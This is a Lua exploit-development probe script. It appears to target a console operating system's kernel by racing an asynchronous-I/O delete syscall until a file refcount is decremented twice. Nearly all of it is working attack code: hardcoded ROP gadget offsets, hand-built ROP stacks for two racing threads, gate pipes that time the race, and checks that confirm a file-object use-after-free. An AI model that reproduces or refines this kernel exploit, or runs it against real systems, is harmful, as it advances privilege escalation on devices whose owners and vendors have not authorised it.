-- CRASH_CLASS: HIGH
-- PROBE 69p: File refcount double-decrement test via 662 race
--
-- Decompile-verified: entry_dispose does `lock xadd [*(I+0x10 deobf)+0x28], -1`
-- which decrements the file refcount. The 65l race reported 65/480 IDs with
-- double-SUCCESS. If entry_dispose runs twice on the same I object, the file
-- refcount is decremented twice. With careful fd management, this can produce
-- a file-object UAF (refcount hits 0 while fd table still references it).
--
-- Test plan:
-- [A] Baseline: open a DEDICATED fd, submit N AIO, delete normally, verify fd works
-- [B] Race: open a DEDICATED fd, submit N AIO, poll, run 65l race, check fd state
--     - If double-decrement happened: close(fd) may crash, or fd becomes invalid
--     - If no double-decrement: fd works normally after race
-- [C] fd reuse detection: after race, close fd, open new fd, check fd number reuse
-- [D] Repeat with different fd types (/dev/zero, /dev/rng, socketpair)

print("=== PROBE 69p: FILE REFCOUNT DOUBLE-DECREMENT UAF ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS, SIGSEGV, SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- AIO helpers
local BATCH = 8
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one_fd(fd)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- Gate setup
local function make_gate()
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    local r = rd(N(sp)) or -1
    local w = rd(N(sp) + 4) or -1
    return r, w
end

local gate_rd_A, gate_wr_A = make_gate()
local gate_rd_B, gate_wr_B = make_gate()
print(string.format("gateA: rd=%d wr=%d", gate_rd_A, gate_wr_A))
print(string.format("gateB: rd=%d wr=%d", gate_rd_B, gate_wr_B))
if gate_rd_A < 0 or gate_rd_B < 0 then print("GATE FAIL"); return end

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_A = memory.alloc(8)
local tmp_B = memory.alloc(8)
local wbyte = memory.alloc(8)
wd(N(wbyte), 0x42)

local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)

-- ============================================================
-- [A] BASELINE: submit + normal delete + verify fd still works
-- ============================================================
print("")
print("[A] BASELINE: normal AIO lifecycle on dedicated fd")

local fd_base = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("  fd_base=" .. fd_base)
if fd_base < 0 then print("FAIL: no /dev/zero"); return end

local base_ids = {}
for i = 1, BATCH do
    local id = submit_one_fd(fd_base)
    if id ~= 0 then base_ids[#base_ids + 1] = id end
end
print(string.format("  submitted %d AIO on fd=%d", #base_ids, fd_base))

for _, id in ipairs(base_ids) do poll_one(id) end
print("  polled all")

for _, id in ipairs(base_ids) do
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end
print("  deleted all (normal single-thread)")

local read_buf = memory.alloc(16)
local read_ret = nil
pcall(function()
    read_ret = mk(3)(uint64(fd_base), uint64(N(read_buf)), uint64(8))
end)
print(string.format("  read(fd=%d) after normal delete: ret=%s", fd_base,
    read_ret and tostring(sgn(read_ret)) or "nil"))

pcall(function() mk(6)(uint64(fd_base)) end)
print("  closed baseline fd")

if not alive() then print("DEAD after baseline"); return end

-- ============================================================
-- [B] RACE: open dedicated fd, submit, poll, 2-thread race,
--     then check fd state
-- ============================================================
print("")
print("[B] RACE: file refcount test (10 iterations)")

local total_double = 0
local total_fd_dead = 0

for iter = 1, 10 do
    if not alive() then print("  DEAD at iter " .. iter); break end

    -- Open a fresh fd for THIS iteration only
    local fd_race = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
    if fd_race < 0 then
        print(string.format("  iter %d: FAIL open /dev/zero", iter))
        break
    end

    -- Submit BATCH AIO using this fd
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one_fd(fd_race)
        if id ~= 0 then ids[#ids + 1] = id end
    end
    if #ids < BATCH then
        print(string.format("  iter %d: only %d ids submitted", iter, #ids))
        pcall(function() mk(6)(uint64(fd_race)) end)
        break
    end

    -- Poll all (required for 662 delete)
    for _, id in ipairs(ids) do poll_one(id) end

    -- Write IDs to shared buffer
    for i = 0, BATCH - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAA)
        wd(N(states_B) + i * 4, 0xBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Build child A ROP: marker -> gate -> 662 -> exit
    local sb_A = N(stk_A)
    for i = 0, 0x3FFC, 4 do wd(sb_A + i, 0) end
    local sp_a = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    local oa = 0
    local function wa(v) wq(sp_a + oa, v); oa = oa + 8 end
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gate_rd_A))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    -- Build child B ROP: marker -> gate -> 662 -> exit
    local sb_B = N(stk_B)
    for i = 0, 0x3FFC, 4 do wd(sb_B + i, 0) end
    local sp_b = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    local ob = 0
    local function wb(v) wq(sp_b + ob, v); ob = ob + 8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(gate_rd_B))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    -- Spawn children
    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa) + 0x10, uint64(sb_A))
    wq(N(pa) + 0x18, uint64(0x2000))

    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb) + i, 0) end
    wq(N(pb), g_bare_ret)
    wq(N(pb) + 0x10, uint64(sb_B))
    wq(N(pb) + 0x18, uint64(0x2000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    -- Wait for markers
    local a_rdy, b_rdy = false, false
    for w = 1, 500000 do
        if not a_rdy and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a_rdy = true end
        if not b_rdy and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b_rdy = true end
        if a_rdy and b_rdy then break end
    end
    if not (a_rdy and b_rdy) then
        print(string.format("  iter %d: TIMEOUT", iter))
        pcall(function() mk(6)(uint64(fd_race)) end)
        break
    end

    -- Fire BOTH gates near-simultaneously (maximize TOCTOU window)
    pcall(function() mk(4)(uint64(gate_wr_A), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gate_wr_B), uint64(N(wbyte)), uint64(1)) end)

    -- Wait for children to complete
    for w = 1, 200000 do end

    if not alive() then
        print(string.format("  iter %d: CRASHED after race (file refcount UAF?)", iter))
        break
    end

    -- Count double-SUCCESS
    local a_ok, b_ok = 0, 0
    local both_ok = 0
    for i = 0, BATCH - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAA
        local sB = rd(N(states_B) + i * 4) or 0xBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then both_ok = both_ok + 1 end
    end
    total_double = total_double + both_ok

    -- *** CRITICAL TEST: Is the fd still valid? ***
    -- If entry_dispose double-decremented the file refcount,
    -- the file object may be freed. Accessing fd_race should fail or crash.
    local fd_ok = true

    -- Test 1: read from fd_race
    for i = 0, 12, 4 do wd(N(read_buf) + i, 0xDEAD) end
    local rr = nil
    pcall(function()
        rr = mk(3)(uint64(fd_race), uint64(N(read_buf)), uint64(8))
    end)
    local read_val = sgn(rr or uint64(0xFFFFFFFF))
    if read_val < 0 then fd_ok = false end

    -- Test 2: fstat on fd_race
    local stat_buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do wd(N(stat_buf) + i, 0xAB) end
    local fstat_ret = nil
    pcall(function()
        fstat_ret = mk(189)(uint64(fd_race), uint64(N(stat_buf)))
    end)
    local fstat_val = sgn(fstat_ret or uint64(0xFFFFFFFF))
    if fstat_val < 0 then fd_ok = false end

    -- Test 3: close fd_race
    local close_ret = nil
    pcall(function()
        close_ret = mk(6)(uint64(fd_race))
    end)
    local close_val = sgn(close_ret or uint64(0xFFFFFFFF))

    -- Test 4: try to open a new fd and see if we get the same number
    local fd_new = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
    local fd_reused = (fd_new == fd_race)

    if not fd_ok then total_fd_dead = total_fd_dead + 1 end

    local tag = ""
    if both_ok > 0 then tag = " DOUBLE" end
    if not fd_ok then tag = tag .. " FD_DEAD" end
    if fd_reused then tag = tag .. " REUSED" end

    print(string.format(
        "  iter %d: A=%d B=%d both=%d read=%d fstat=%d close=%d new_fd=%d%s",
        iter, a_ok, b_ok, both_ok, read_val, fstat_val, close_val, fd_new, tag))

    -- Close the new fd
    if fd_new >= 0 then pcall(function() mk(6)(uint64(fd_new)) end) end

    if not alive() then
        print(string.format("  CRASHED after fd tests in iter %d", iter))
        break
    end
end

if not alive() then print("DEAD after section B"); return end

-- ============================================================
-- [C] CONTROLLED RACE: Use fd with known refcount
-- Open fd, dup() it to increase refcount, submit AIO, race delete
-- ============================================================
print("")
print("[C] CONTROLLED: socketpair fd (refcount=2 from pair)")

local sp_buf = memory.alloc(16)
wd(N(sp_buf), 0xFFFFFFFF); wd(N(sp_buf) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sp_buf))) end)
local sp_rd = rd(N(sp_buf)) or -1
local sp_wr = rd(N(sp_buf) + 4) or -1
print(string.format("  socketpair: rd=%d wr=%d", sp_rd, sp_wr))

if sp_rd >= 0 then
    -- Submit AIO using the READ end of the socketpair
    -- First write data so AIO read has something
    local wr_data = memory.alloc(64)
    for i = 0, 60, 4 do wd(N(wr_data) + i, 0x41) end
    pcall(function() mk(4)(uint64(sp_wr), uint64(N(wr_data)), uint64(32)) end)

    local sp_ids = {}
    for i = 1, BATCH do
        local id = submit_one_fd(sp_rd)
        if id ~= 0 then sp_ids[#sp_ids + 1] = id end
    end
    print(string.format("  submitted %d AIO on socketpair rd=%d", #sp_ids, sp_rd))

    for _, id in ipairs(sp_ids) do poll_one(id) end

    -- Race delete (reuse gates)
    for i = 0, BATCH - 1 do
        wd(N(del_ids) + i * 4, sp_ids[i + 1] or 0)
        wd(N(states_A) + i * 4, 0xAA)
        wd(N(states_B) + i * 4, 0xBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Rebuild child stacks (same pattern)
    local sb_A2 = N(stk_A)
    for i = 0, 0x3FFC, 4 do wd(sb_A2 + i, 0) end
    local sp_a2 = sb_A2 + 0x2000 - ((sb_A2 + 0x2000) % 16) - 8
    local oa2 = 0
    local function wa2(v) wq(sp_a2 + oa2, v); oa2 = oa2 + 8 end
    wa2(g_pop_rax); wa2(uint64(0x41414141))
    wa2(g_pop_rdi); wa2(uint64(N(marker_A))); wa2(g_mov_m_rax)
    wa2(g_pop_rax); wa2(uint64(3))
    wa2(g_pop_rdi); wa2(uint64(gate_rd_A))
    wa2(g_pop_rsi); wa2(uint64(N(tmp_A)))
    wa2(g_pop_rdx); wa2(uint64(1)); wa2(stub)
    wa2(g_pop_rdi); wa2(uint64(N(del_ids)))
    wa2(g_pop_rsi); wa2(uint64(BATCH))
    wa2(g_pop_rdx); wa2(uint64(N(states_A)))
    wa2(g_pop_rax); wa2(uint64(662)); wa2(stub)
    wa2(g_pop_rdi); wa2(uint64(0))
    wa2(g_pop_rax); wa2(uint64(431)); wa2(stub)

    local sb_B2 = N(stk_B)
    for i = 0, 0x3FFC, 4 do wd(sb_B2 + i, 0) end
    local sp_b2 = sb_B2 + 0x2000 - ((sb_B2 + 0x2000) % 16) - 8
    local ob2 = 0
    local function wb2(v) wq(sp_b2 + ob2, v); ob2 = ob2 + 8 end
    wb2(g_pop_rax); wb2(uint64(0x42424242))
    wb2(g_pop_rdi); wb2(uint64(N(marker_B))); wb2(g_mov_m_rax)
    wb2(g_pop_rax); wb2(uint64(3))
    wb2(g_pop_rdi); wb2(uint64(gate_rd_B))
    wb2(g_pop_rsi); wb2(uint64(N(tmp_B)))
    wb2(g_pop_rdx); wb2(uint64(1)); wb2(stub)
    wb2(g_pop_rdi); wb2(uint64(N(del_ids)))
    wb2(g_pop_rsi); wb2(uint64(BATCH))
    wb2(g_pop_rdx); wb2(uint64(N(states_B)))
    wb2(g_pop_rax); wb2(uint64(662)); wb2(stub)
    wb2(g_pop_rdi); wb2(uint64(0))
    wb2(g_pop_rax); wb2(uint64(431)); wb2(stub)

    local pa2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa2) + i, 0) end
    wq(N(pa2), g_bare_ret)
    wq(N(pa2) + 0x10, uint64(sb_A2))
    wq(N(pa2) + 0x18, uint64(0x2000))

    local pb2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb2) + i, 0) end
    wq(N(pb2), g_bare_ret)
    wq(N(pb2) + 0x10, uint64(sb_B2))
    wq(N(pb2) + 0x18, uint64(0x2000))

    pcall(function() mk(455)(pa2, uint64(0x38)) end)
    pcall(function() mk(455)(pb2, uint64(0x38)) end)

    local a2_rdy, b2_rdy = false, false
    for w = 1, 500000 do
        if not a2_rdy and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a2_rdy = true end
        if not b2_rdy and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b2_rdy = true end
        if a2_rdy and b2_rdy then break end
    end

    if a2_rdy and b2_rdy then
        pcall(function() mk(4)(uint64(gate_wr_A), uint64(N(wbyte)), uint64(1)) end)
        pcall(function() mk(4)(uint64(gate_wr_B), uint64(N(wbyte)), uint64(1)) end)
        for w = 1, 200000 do end

        if alive() then
            local a2_ok, b2_ok, both2 = 0, 0, 0
            for i = 0, BATCH - 1 do
                local sA = rd(N(states_A) + i * 4) or 0xAA
                local sB = rd(N(states_B) + i * 4) or 0xBB
                if sA == 0 then a2_ok = a2_ok + 1 end
                if sB == 0 then b2_ok = b2_ok + 1 end
                if sA == 0 and sB == 0 then both2 = both2 + 1 end
            end

            -- Check BOTH fds of the socketpair
            local rd_ret = nil
            pcall(function() rd_ret = mk(3)(uint64(sp_rd), uint64(N(read_buf)), uint64(1)) end)
            local wr_ret = nil
            pcall(function() wr_ret = mk(4)(uint64(sp_wr), uint64(N(wr_data)), uint64(1)) end)

            print(string.format("  SOCKETPAIR RACE: A=%d B=%d both=%d rd_ret=%s wr_ret=%s",
                a2_ok, b2_ok, both2,
                rd_ret and tostring(sgn(rd_ret)) or "nil",
                wr_ret and tostring(sgn(wr_ret)) or "nil"))

            if both2 > 0 then
                print("  *** DOUBLE-SUCCESS on socketpair fd ***")
                -- If read/write return unexpected values, file may be corrupted
                if rd_ret and sgn(rd_ret) < 0 then
                    print("  *** FD DEAD after double-delete: FILE REFCOUNT UAF ***")
                end
            end
        else
            print("  CRASHED during socketpair race")
        end
    else
        print(string.format("  TIMEOUT: a=%s b=%s", tostring(a2_rdy), tostring(b2_rdy)))
    end

    pcall(function() mk(6)(uint64(sp_rd)) end)
    pcall(function() mk(6)(uint64(sp_wr)) end)
end

-- ============================================================
-- [D] SUMMARY
-- ============================================================
print("")
print("[D] SUMMARY")
print(string.format("  total double-SUCCESS IDs: %d", total_double))
print(string.format("  total fd_dead after race: %d", total_fd_dead))
if total_double > 0 and total_fd_dead == 0 then
    print("  DOUBLE-SUCCESS occurs but fd remains valid")
    print("  Possible: 2nd thread's entry_dispose is blocked by TOCTOU")
    print("  OR: refcount survives double-decrement (initial count > expected)")
end
if total_fd_dead > 0 then
    print("  *** FILE REFCOUNT UNDERFLOW CONFIRMED ***")
    print("  entry_dispose double-decrement creates file-object UAF")
end
if total_double == 0 then
    print("  No double-SUCCESS — TOCTOU window too narrow for BATCH=" .. BATCH)
    print("  Try with more iterations or smaller batch")
end

print("")
print("=== PROBE 69p COMPLETE ===")
